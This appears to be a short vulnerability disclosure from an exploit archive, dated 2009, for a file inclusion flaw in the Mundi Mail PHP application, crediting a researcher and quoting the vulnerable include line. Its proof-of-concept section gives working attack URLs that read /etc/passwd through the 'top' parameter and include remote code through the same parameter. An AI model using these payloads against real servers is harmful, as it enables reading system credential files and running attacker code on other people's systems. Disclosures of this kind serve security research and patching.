@@ -1,0 +1,50 @@
+----------------------------------------------------------------------------------------------------------
+
+
+  Name : Mundi Mail
+  Site : http://sourceforge.net/projects/mundimail/
+
+  Down : http://sourceforge.net/project/showfiles.php?group_id=100875&package_id=108474&release_id=221732
+
+
+----------------------------------------------------------------------------------------------------------
+
+
+ 
+  Found By : br0ly
+  Made in  : Brasil
+  Contact  : br0ly[dot]Code[at]gmail[dot]com
+
+
+----------------------------------------------------------------------------------------------------------
+
+
+  Description:
+
+  Bug : Local/Remote File Inclusion
+
+ template/simpledefault/admin/_masterlayout.php:10:	include($top);
+
+
+
+
+  If allow_url_fopen=on   --> RFI;
+  If magic_quotes_gpc=off --> LFI;  
+
+
+
+----------------------------------------------------------------------------------------------------------
+
+
+  P0c:
+ 
+    LFI:http://localhost/Scripts/mundimail/template/simpledefault/admin/_masterlayout.php?top=/etc/passwd
+
+    RFI:http://localhost/Scripts/mundimail/template/simpledefault/admin/_masterlayout.php?top=[EVIL_CODE]
+
+
+  OBS: need register_globals=on;
+
+----------------------------------------------------------------------------------------------------------
+
+# milw0rm.com [2009-06-15]
